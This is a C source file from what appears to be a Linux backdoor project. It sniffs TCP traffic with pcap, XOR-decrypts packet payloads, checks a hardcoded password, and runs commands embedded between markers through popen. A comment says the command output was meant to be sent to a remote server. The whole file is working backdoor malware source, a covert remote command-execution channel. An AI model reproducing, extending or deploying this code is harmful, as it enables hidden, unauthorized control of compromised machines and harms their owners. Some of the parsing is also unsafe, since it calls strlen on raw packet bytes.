/*-----------------------------------------------------------------------------
 * pkt_cap.c - Linux backdoor packet capture
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "pkt_cap.h"
#include "utils.h"

/*-----------------------------------------------------------------------------
 * FUNCTION:    packet_callback
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   packet_callback(unsigned char *args,
 *                              const struct pcap_pkthdr *header,
 *                              const unsigned char *packet)
 *                   args - arguments passed by loop
 *                   header - the packet header
 *                   packet - user data (packet payload)
 * 
 * RETURNS:     void
 * 
 * NOTES: Callback for handling sniffed packets. Only responds to commands where
 *        the password and encryption matches.
 *
 *----------------------------------------------------------------------------*/
void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
		const unsigned char *packet)
{
	/* declare pointers to packet headers */
	const struct pcap_ip *ip;				/* The IP header */
	const struct pcap_tcp *tcp;				/* The TCP header */
	const unsigned char *payload;			/* Packet payload */

	int size_ip;
	int size_tcp;
	int size_payload;

	char *start, *end;
	char password[strlen(PASSWORD) + 1];
	char decrypted[MAX_PKT_LEN];
	char command[MAX_PKT_LEN];

	/* define/compute ip header offset */
	ip = (struct pcap_ip *)(packet + ETHERNET_SIZE);
	size_ip = IP_HL(ip) * 4;

	/* verify IP header length */
	if (size_ip < 20)
		return; /* invalid IP header length */

	/* only watch TCP packets (the filter should cover this */
	if (ip->ip_p != IPPROTO_TCP)
		return; /* not TCP */

	/* calculate tcp header offset */
	tcp = (struct pcap_tcp *)(packet + ETHERNET_SIZE + size_ip);
	size_tcp = TH_OFF(tcp) * 4;

	/* verify TCP header length */
	if (size_tcp < 20)
		return; /* invalid TCP header length */

	/* calculate tcp payload (segment) offset */
	payload = (unsigned char *)(packet + ETHERNET_SIZE + size_ip + size_tcp);

	/* calculate tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

	/* decrypt the payload */
	strncpy(decrypted, xor((char *)payload), strlen((char *)payload));
	/* strncpy(decrypted, (char *)payload, strlen((char *)payload)); */

	/* grab the password field */
	memset(password, 0x0, sizeof(password));
	strncpy(password, decrypted, strlen(PASSWORD));

	if (!(start = strstr(decrypted, EXT_CMD_START)))
		return; /* no command or command results in decrypted results */

	start += strlen(EXT_CMD_START);

	if (!(end = strstr(start, EXT_CMD_END)))
		return; /* we have no command end */

	/* grab the command or command results */
	memset(command, 0x0, sizeof(command));
	strncpy(command, start, (end - start));

	/* print password & received command */
	if (print_output) {
		printf("password = %s\n", password);
		printf("command  = %s\n", command);
	}

	/* run command if we're the server & password matches */
	if (server && (strcmp(password, PASSWORD) == 0)) {
		if (print_output)
			printf("password correct, executing command...\n");
		/* system(command); */
		send_command(command);
	}
	else
		if (print_output)
			printf("password incorrect, ignoring command...\n");

	return;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    send_command
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   send_command(char *command)
 *                   command - command to execute locally
 * 
 * RETURNS:     void
 * 
 * NOTES: Currently only prints out the results of the executed command,
 *        however, this function was meant to encompass sending the results
 *        to a remote server.
 *
 *----------------------------------------------------------------------------*/
void send_command(char *command)
{
	FILE *file;
	char buffer[524280];
	int read_bytes;

	if ((file = popen(command, "r")) == NULL) {
		err(1, "popen");
	}

	memset(buffer, 0x0, sizeof(buffer));
	read_bytes = fread(buffer, sizeof(char), 524280 - 1, file);

/*	read_bytes = fread(buffer + strlen(PASSWORD) + strlen(EXT_CMD_START),
			sizeof(char), 524280 - 1, file);
	memcpy(buffer, PASSWORD, strlen(PASSWORD));
	memcpy(buffer + strlen(PASSWORD), EXT_CMD_START, strlen(EXT_CMD_START));
	memcpy(buffer + strlen(PASSWORD) + strlen(EXT_CMD_START) + read_bytes,
			EXT_CMD_END, strlen(EXT_CMD_END)); */

	if (print_output)
		printf("command results:\n %s", buffer);

	fclose(file);
}
